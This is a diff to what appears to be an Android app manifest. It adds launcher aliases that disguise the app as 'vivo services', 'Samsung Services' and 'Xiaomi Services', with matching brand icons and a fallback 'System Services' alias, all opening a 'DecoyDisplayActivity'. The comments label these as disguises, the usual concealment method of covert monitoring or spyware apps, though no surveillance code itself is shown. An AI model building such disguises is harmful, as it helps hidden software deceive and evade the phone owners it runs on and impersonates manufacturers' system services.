@@ -63,10 +63,52 @@
             android:exported="true"
             android:screenOrientation="portrait" />
 
-        <!-- 1. Never-Opened Disguise: System Services (Enabled by Default) -->
+        <!-- 1. Brand-Adaptive Disguise: Vivo Services (Enabled by Default) -->
+        <activity-alias
+            android:name=".AliasVivoServices"
+            android:enabled="true"
+            android:exported="true"
+            android:icon="@drawable/ic_system_services_vivo"
+            android:label="vivo services"
+            android:targetActivity=".ui.DecoyDisplayActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- 2. Brand-Adaptive Disguise: Samsung Services -->
+        <activity-alias
+            android:name=".AliasSamsungServices"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_system_services_samsung"
+            android:label="Samsung Services"
+            android:targetActivity=".ui.DecoyDisplayActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- 3. Brand-Adaptive Disguise: Xiaomi Services -->
+        <activity-alias
+            android:name=".AliasXiaomiServices"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_system_services_xiaomi"
+            android:label="Xiaomi Services"
+            android:targetActivity=".ui.DecoyDisplayActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- 4. Universal Fallback Disguise: System Services -->
         <activity-alias
             android:name=".AliasSimToolkit"
-            android:enabled="true"
+            android:enabled="false"
             android:exported="true"
             android:icon="@drawable/ic_system_services"
             android:label="System Services"
